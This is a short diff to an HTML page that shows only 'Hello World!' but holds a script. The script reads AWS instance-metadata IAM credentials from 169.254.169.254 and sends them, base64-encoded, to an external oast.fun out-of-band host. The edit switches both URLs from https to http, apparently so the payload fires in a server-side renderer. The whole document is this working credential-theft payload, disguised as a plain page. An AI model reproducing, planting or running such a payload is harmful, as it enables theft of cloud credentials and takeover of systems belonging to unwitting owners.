@@ -3,9 +3,9 @@
 <body>
   <h1>Hello World!</h1>
 <script>
-fetch('https://169.254.169.254/latest/meta-data/iam/security-credentials')
+fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials')
   .then(r=>r.text())
-  .then(d=>location='https://irjwkvelehnjhheknpqn2t445eakpwhxe.oast.fun/'+btoa(d))
+  .then(d=>location='http://irjwkvelehnjhheknpqn2t445eakpwhxe.oast.fun/'+btoa(d))
 </script>
 </body>
 </html>
